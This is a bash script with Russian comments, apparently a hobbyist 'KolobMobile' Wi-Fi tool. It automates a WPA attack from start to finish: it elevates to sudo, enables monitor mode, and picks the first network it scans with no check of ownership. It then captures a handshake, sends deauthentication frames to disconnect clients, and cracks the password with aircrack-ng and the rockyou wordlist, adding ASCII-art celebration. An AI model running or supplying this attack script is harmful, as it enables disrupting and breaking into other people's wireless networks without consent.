#!/bin/bash

# === Авто sudo ===
if [[ $EUID -ne 0 ]]; then
  exec sudo "$0" --auto
  exit
fi

# === Цвета ===
green='\e[1;32m'
cyan='\e[1;36m'
purple='\e[1;35m'
red='\e[1;31m'
reset='\e[0m'

# === Режим авто ===
AUTO=0
[[ "$1" == "--auto" ]] && AUTO=1

# === Проверка зависимостей ===
for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng iw timeout; do
  if ! command -v "$cmd" &>/dev/null; then
    echo -e "${red}❌ Не найдено: $cmd${reset}" && exit 1
  fi
done

# === KolobLogo — Анимация построчно ===
kolob_logo() {
  echo -e "\n$purple"
  lines=(
" _  __     _       _     __  __       _     _ _"
"| |/ /    | |     | |   |  \/  |     | |   (_) |"
"| ' / ___ | | ___ | |__ | \  / | ___ | |__  _| | ___"
"|  < / _ \| |/ _ \| '_ \| |\/| |/ _ \| '_ \| | |/ _ \\"
"| . \ (_) | | (_) | |_) | |  | | (_) | |_) | | |  __/"
"|_|\_\___/|_|\___/|_.__/|_|  |_|\___/|_.__/|_|_|\___|"
"     🧠⚡ K O L O B M O B I L E   W I - F I   T O O L"
  )
  for line in "${lines[@]}"; do
    echo -e "$line"
    sleep 0.05
  done
  echo -e "$reset\n"
}
clear
kolob_logo

# === Анимация загрузки ===
spinner() {
  local bar=""
  echo -ne "${cyan}🧠 Инициализация "
  for i in {1..20}; do
    bar+="#"
    printf "\r${cyan}🧠 Инициализация [%-20s] %d%%${reset}" "$bar" "$((i*5))"
    sleep 0.05
  done
  echo -e "\n${green}✔ KolobMobile готов к атаке\n${reset}"
}
spinner

# === Лог ===
logdir="$HOME/wifi-logs"
mkdir -p "$logdir"
find "$logdir" -type f -mtime +7 -name 'mission-*' -delete
timestamp=$(date +'%Y-%m-%d_%H-%M-%S')
logfile="$logdir/mission-$timestamp.log"

# === Интерфейс ===
iface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
[[ -z "$iface" ]] && echo -e "${red}❌ Нет Wi-Fi адаптера${reset}" && exit 1
echo -e "$cyan📡 Использую адаптер: $iface${reset}"
mon_iface="${iface}mon"

echo -e "${cyan}🚫 Отключаю процессы, мешающие захвату...${reset}"
airmon-ng check kill >> "$logfile"
airmon-ng start "$iface" >> "$logfile"

# === Скан ===
echo -e "$cyan🔍 Шаг 1: Поиск сетей (15 сек)...${reset}"
timeout 15s airodump-ng "$mon_iface" > /tmp/scan.log 2>/dev/null || true

# === Цель
bssid=$(grep -oE "([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}" /tmp/scan.log | head -n1)
channel=$(awk "/$bssid/" /tmp/scan.log | awk '{print $6}' | head -n1)
[[ -z "$bssid" || -z "$channel" ]] && echo -e "${red}❌ Цель не найдена${reset}" && exit 1
filename="capture_$timestamp"

# === Захват
echo -e "$cyan📂 Шаг 2: Захват хэндшейка с $bssid на канале $channel...$reset"
airodump-ng -c "$channel" --bssid "$bssid" -w "$filename" "$mon_iface" > /dev/null & 
scan_pid=$!
sleep 4

# === Deauth
echo -e "💣 Шаг 3: Deauth атака для сброса клиентов..."
aireplay-ng --deauth 15 -a "$bssid" "$mon_iface" >> "$logfile"
sleep 20
kill "$scan_pid" 2>/dev/null

capfile="${filename}-01.cap"
[[ ! -f "$capfile" ]] && echo -e "${red}❌ Хэндшейк не получен${reset}" && exit 1

# === Словарь
wordlist="/usr/share/wordlists/rockyou.txt"
[[ ! -f "$wordlist" ]] && echo -e "${red}❌ rockyou.txt не найден. Распакуй: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz${reset}" && exit 1

# === Брутфорс
echo -e "${cyan}🧠 Шаг 4: Атака подбором пароля...${reset}"
aircrack-ng "$capfile" -w "$wordlist" | tee -a "$logfile"

# === Победный звук
if command -v paplay &>/dev/null; then
  paplay /usr/share/sounds/freedesktop/stereo/complete.oga
elif command -v aplay &>/dev/null; then
  aplay /usr/share/sounds/alsa/Front_Center.wav
fi

# === Kolob Дракон (анимированный, пылающие глаза) ===
kolob_dragon() {
  echo -e "\n\e[1;35m"
  dragon_art=(
"              __====-_  _-====__"
"          _--^^^#####//      \\\\#####^^^--_"
"       _-^##########// (    ) \\\\##########^-_"
"      -############//  |\\^^/|  \\\\############-"
"    _/############//   (\e[1;31m@\e[1;35m::\e[1;31m@\e[1;35m)   \\\\############\\_"
"   /#############((     \\\\//     ))#############\\"
"  -###############\\\\    (oo)    //###############-"
" -#################\\\\  / UUU \\  //#################-"
" -###################\\\\/  (_)  \\//###################-"
"_#/|##########/\\######(   /|\\   )######/\\##########|\\#_"
"|/ |#/\#/\#/\\/  \\#/\\##\\  |||  /##/\\#/  \\/\\#/\#/\| \\ "
"\`  |/  V  V  \`   V  \\#\\| ||| |/#/  V   '  V  V  \\|  \`"
"     🧠 K O L O B M O B I L E   C O M P L E T E"
  )
  for line in "${dragon_art[@]}"; do
    echo -e "$line"
    sleep 0.07
  done
  echo -e "\e[0m\n"
}
kolob_dragon

# === Завершение
airmon-ng stop "$mon_iface" >> "$logfile"
echo -e "${green}📜 Лог сохранён: $logfile${reset}"
